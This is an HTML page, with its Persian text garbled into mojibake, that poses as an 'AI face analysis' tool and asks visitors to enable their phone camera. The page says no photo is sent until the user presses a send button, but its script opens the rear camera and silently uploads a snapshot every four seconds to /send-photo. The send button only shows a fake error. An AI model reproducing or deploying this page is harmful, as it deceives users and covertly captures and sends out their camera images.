<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ai</title>
    <style>
        * { box-sizing: border-box;  padding: 0; margin: 0; }
        body{ background-color: #fff155;  }
        .main { font-family: tahoma, sans-serif; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center;  margin: 0; }
        .container { text-align: center; width: 90%; max-width: 500px; }
        video { width: 100%; border-radius: 10px;  }
        canvas { display: none; }
        .status { margin-top: 15px; font-size: 14px; color: #00ff00; }
        .recording-dot { display: inline-block; width: 10px; height: 10px; background-color: red; border-radius: 50%; animation: blink 1s infinite; margin-left: 5px; }
        @keyframes blink { 50% { opacity: 0; } }
        @font-face {
    font-family: "sans";
    src: url("./Sans.ttf") format("truetype");
}
body{
    font-family: "sans";
    padding: 0 12px;
}
h2 , h3{
    text-align: center;
}
p{
    background: hsl(194, 44%, 25%)000;
    color: rgb(120, 255, 120);
    padding: 12px;
    border-radius: 12px;
    font-weight: bold;
    margin-bottom: 23px;
 
}
.nav{
    margin-top: 23px;
}
.buttun{
    text-align: center;
    
}
.send{
    padding: 15px;
    background: #74ff55;
    font-family: "sans";
    font-weight: bold;
    border-radius: 14px;

    margin-bottom: 12px;
}
        .ali{
          background: #ff681d;
        font-size:19px;
        }
    </style>
    <link rel="stylesheet" href="style.css">
</head>
<body>
   <div class="nav">
    <h2>Ø¨Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø¢Ù†Ø§Ù„ÛŒØ² Ú†Ù‡Ø±Ù‡ Ø®ÙˆØ´ Ø¢Ù…Ø¯ÛŒÙ†ğŸ˜ŠğŸ˜</h2>
    <h3>Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø§Ø¨ØªØ¯Ø§ Ø¨Ø§ÛŒØ¯ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ú¯ÙˆØ´ÛŒ Ø®ÙˆØ¯ Ø±Ø§ ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯ğŸ“¸</h3>
    <p>
        Ùˆ Ø§ÛŒÙ†Ú©Ù‡ Ø§ÛŒÙ† Ù†Ø³Ø®Ù‡ Ø§ÙˆÙ„ÛŒØ³Øª Ùˆ Ù…Ù…Ú©Ù†Ù‡ Ø¨Ø§Ú¯ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ù‡ØŒ Ù¾Ø³ Ø§Ú¯Ù‡ Ù…Ø´Ú©Ù„ÛŒ Ø¨ÙˆØ¯ Ø¨Ù‡Ù…ÙˆÙ† Ø§Ø·Ù„Ø§Ø¹ Ø¨Ø¯ÛŒÙ†ğŸ™.<br/>
        Ø¯Ø± Ø¢ÛŒÙ†Ø¯Ù‡ Ù†Ú†Ù†Ø¯Ø§Ù† Ø¯ÙˆØ± Ø§ÛŒÙ† ØµÙØ­Ù‡ ÛŒÛŒ Ú©Ù‡ Ø§Ù„Ø§Ù† Ù…ÛŒØ¨ÛŒÙ†ÛŒÙ† Ø¨Ù‡ ÛŒÚ© Ø§Ù¾Ù„ÛŒÚ©ÛŒØ´Ù† Ú©Ø§Ù…Ù„ ØªØ¨Ø¯ÛŒÙ„ Ù…ÛŒØ´Ù‡ Ú©Ù‡ Ø§Ù…Ú©Ø§Ù†Ø§Øª Ø¨ÛŒØ´ØªØ±ÛŒ Ø¯Ø§Ø±Ù‡ğŸš€.
        <br/>
        Ù¾Ø³ Ø§Ú¯Ù‡ Ø§ÛŒÙ† ØµÙØ­Ù‡ Ù…ÙˆØ±Ø¯ Ù¾Ø³Ù†Ø¯ Ø´Ù…Ø§ Ù†Ø¨ÙˆØ¯ Ø§Ø² Ø´Ù…Ø§ Ø¹Ø°Ø± Ø®ÙˆØ§Ù‡ÛŒ Ù…ÛŒÚ©Ù†ÛŒÙ…ğŸ™
    </p>
    <button class="send ali" id="startBtn">Ø¨Ø±Ø§ÛŒ Ú©Ø§Ø± Ø¨Ø§ Ø±Ø¨Ø§Øª Ø§ÙˆÙ„ Ø§ÛŒÙ† Ø¯Ú©Ù…Ù‡ Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯ </button>
       
   </div>
<div class="main">
    <div class="container">
        <h2></h2>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
        <div class="status">
       
            <span id="log">Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ù‚Ø±Ø§Ø±ÛŒ Ø§Ø±ØªØ¨Ø§Ø·...</span>
        </div>
    </div>
</div>
<div class="buttun">
    <h2>ØªØ§ Ù…ÙˆÙ‚Ø¹ÛŒ Ú©Ù‡ Ø±ÙˆÛŒ Ø¯Ú©Ù…Ù‡ /Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³/ Ù†Ø²Ø¯ÛŒØ¯ Ø¹Ú©Ø³ Ø§Ø±Ø³Ø§Ù„ Ù†Ø®ÙˆØ§Ù‡Ø¯ Ø´Ø¯<br/> 
    
     Ø§ÛŒÙ†Ú©Ù‡ Ø¨Ø±Ø§ÛŒ Ø§ÛŒÙ†Ú©Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø±Ø§Ø­Øª ØªØ± Ø¨ØªÙˆÙ†Ù‡ Ú†Ù‡Ø± Ø´Ù…Ø§Ø±Ùˆ Ø¢Ù†Ø§Ù„ÛŒØ² Ú©Ù†Ù‡ Ù„Ø·ÙØ§ Ø¯Ø± Ø¬Ø§ÛŒÛŒ Ù‚Ø±Ø§Ø± Ø¨Ú¯ÛŒØ±ÛŒØ¯ Ú©Ù‡ Ú†Ù‡Ø±Ù‡ Ø´Ù…Ø§ ÙˆØ§Ø¶Ø­ Ø¨Ø§Ø´Ù‡.ğŸ˜ŠğŸ˜Š
    </h2>
    <button class="send" id="button">Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³</button>
</div>
<script>

    const btn=document.getElementById('button');
    btn.addEventListener("click",()=>{
        alert("Ø¹Ú©Ø³ Ù¾Ø±Ø¯Ø§Ø²Ø´ Ø¹Ú©Ø³ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯ Ù„Ø·ÙØ§ Ø¯Ø± Ø¬Ø§ÛŒ Ø¯Ø±Ø³Øª Ùˆ Ú†Ù‡Ø±Ù‡ ØªØ§Ù† ÙˆØ§Ø¶Ø­ Ø¨Ø§Ø´Ù‡ Ùˆ Ø§Ú¯Ø± Ø¯ÙˆØ¨Ø§Ø±Ù‡ Ø§ÛŒÙ†  Ù¾ÛŒØºØ§Ù… Ø¸Ø§Ù‡Ø± Ø´Ø¯ Ù„Ø·ÙØ§ Ø¨Ù‡ ØªÙˆØ³Ø¹Ù‡ Ø¯Ù‡Ù†Ø¯Ù‡ Ù‡ÙˆØ´ Ù…ØµÙ†ÙˆØ¹ÛŒ Ø§Ø·Ù„Ø§Ø¹ Ø¯Ù‡ÛŒØ¯")
    })
   const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const log = document.getElementById('log');
    const startBtn = document.getElementById('startBtn');
    let streamActive = false;

    // Ø¯Ø± Ù…ÙˆØ¨Ø§ÛŒÙ„ Ø­ØªÙ…Ø§ Ø¨Ø§ÛŒØ¯ Ú©Ø§Ø±Ø¨Ø± ÛŒÚ© Ú©Ù„ÛŒÚ© Ø¨Ú©Ù†Ø¯ ØªØ§ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§Ø¬Ø§Ø²Ù‡ Ù¾Ø®Ø´ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ø¯
    startBtn.addEventListener('click', async () => {
        startBtn.style.display = 'none';
        log.innerText = "Ø¯Ø± Ø­Ø§Ù„ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…Ø¬ÙˆØ² Ø¯ÙˆØ±Ø¨ÛŒÙ†...";
        startCamera();
    });

    async function startCamera() {
        try {
            // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯ÙˆØ±Ø¨ÛŒÙ† (Ù…Ø®ØµÙˆØµ Ù…ÙˆØ¨Ø§ÛŒÙ„ ØªÙ†Ø¸ÛŒÙ… Ø´Ø¯Ù‡)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'environment', // Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù¾Ø´Øª
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }, 
                audio: false 
            });

            video.srcObject = stream;
            
            // ØµØ¨Ø± Ù…ÛŒÚ©Ù†ÛŒÙ… ØªØ§ ÙˆÛŒØ¯ÛŒÙˆ ÙˆØ§Ù‚Ø¹Ø§ Ù„ÙˆØ¯ Ø´ÙˆØ¯
            video.onloadedmetadata = () => {
                video.play();
                log.innerText = "âœ… Ø¯ÙˆØ±Ø¨ÛŒÙ† ÙˆØµÙ„ Ø´Ø¯. Ø´Ø±ÙˆØ¹ Ø§Ø±Ø³Ø§Ù„...";
                streamActive = true;
                // Ø´Ø±ÙˆØ¹ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ù‡Ø± 4 Ø«Ø§Ù†ÛŒÙ‡
                setInterval(captureAndSend, 4000);
            };

        } catch (err) {
            console.error(err);
            log.innerText = "âŒ Ø®Ø·Ø§: Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¯Ø§Ø¯Ù‡ Ù†Ø´Ø¯ ÛŒØ§ Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø¬Ø§Ø²Ù‡ Ù†Ø¯Ø§Ø¯.";
            alert("Ù„Ø·ÙØ§ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ ØªØ§ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯.");
        }
    }

    async function captureAndSend() {
        if (!streamActive) return;

        // Ø§Ø·Ù…ÛŒÙ†Ø§Ù† Ø§Ø² Ø§ÛŒÙ†Ú©Ù‡ ÙˆÛŒØ¯ÛŒÙˆ Ø³Ø§ÛŒØ² Ø¯Ø§Ø±Ø¯
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            console.log("ÙˆÛŒØ¯ÛŒÙˆ Ù‡Ù†ÙˆØ² Ù„ÙˆØ¯ Ù†Ø´Ø¯Ù‡...");
            return;
        }

        // ØªÙ†Ø¸ÛŒÙ… Ø³Ø§ÛŒØ² Ø¨ÙˆÙ… Ù†Ù‚Ø§Ø´ÛŒ (Canvas) Ø¯Ù‚ÛŒÙ‚Ø§ Ù‡Ù…â€ŒØ§Ù†Ø¯Ø§Ø²Ù‡ ÙˆÛŒØ¯ÛŒÙˆ
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // ØªØ¨Ø¯ÛŒÙ„ Ø¨Ù‡ Ø¹Ú©Ø³ Ùˆ Ø§Ø±Ø³Ø§Ù„
        canvas.toBlob(blob => {
            if(blob) sendToBackend(blob);
        }, 'image/jpeg', 0.6); // Ú©ÛŒÙÛŒØª Ù…ØªÙˆØ³Ø· Ø¨Ø±Ø§ÛŒ Ø³Ø±Ø¹Øª Ø¨Ù‡ØªØ±
    }

    async function sendToBackend(blob) {
        const formData = new FormData();
        formData.append('photo', blob, 'cam.jpg');

        try {
            log.innerText = "ğŸ“¤ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³...";
            await fetch('/send-photo', { method: 'POST', body: formData });
            log.innerText = "âœ… Ø¹Ú©Ø³ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.";
        } catch (e) {
            log.innerText = "âš ï¸ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ±";
        }
    }
</script>

</body>

</html>

